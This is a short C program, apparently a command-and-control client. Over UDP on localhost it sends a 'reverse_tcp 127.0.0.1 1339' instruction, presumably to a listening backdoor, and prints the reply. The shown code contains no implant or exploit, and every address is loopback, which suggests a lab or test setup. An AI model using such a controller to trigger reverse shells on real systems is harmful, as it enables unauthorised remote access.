#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define SERVER_PORT 6567      // Remote udp server port
#define CLIENT_PORT 12345     // Client udp server port
#define BUFFER_SIZE 100       // Size of buffer

int main() {
    int sockfd;
    struct sockaddr_in server_addr, client_addr;
    char buffer[BUFFER_SIZE];
    socklen_t addr_len = sizeof(server_addr);

    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        perror("Erreur lors de la création du socket");
        return -1;
    }

    // Client configuration
    memset(&client_addr, 0, sizeof(client_addr));
    client_addr.sin_family = AF_INET;
    client_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    client_addr.sin_port = htons(CLIENT_PORT);

    // Bind client address with socket
    if (bind(sockfd, (struct sockaddr*)&client_addr, sizeof(client_addr)) < 0) {
        perror("Erreur lors du bind du client");
        close(sockfd);
        return -1;
    }

    // Client server configuration
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK); // Adresse du serveur (localhost)
   
    // Send commands
    strcpy(buffer, "reverse_tcp 127.0.0.1 1339");
    if (sendto(sockfd, buffer, strlen(buffer), 0, (struct sockaddr*)&server_addr, addr_len) < 0) {
        perror("Erreur lors de l'envoi du message");
        close(sockfd);
        return -1;
    }

    printf("Server send message : %s\n", buffer);

    // Receive message
    memset(buffer, 0, BUFFER_SIZE); // Clear buffer before receive
    if (recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&server_addr, &addr_len) < 0) {
        perror("Error with response");
        close(sockfd);
        return -1;
    }

    printf("Response server : %s\n", buffer);

    // Close socket
    close(sockfd);
    return 0;
}
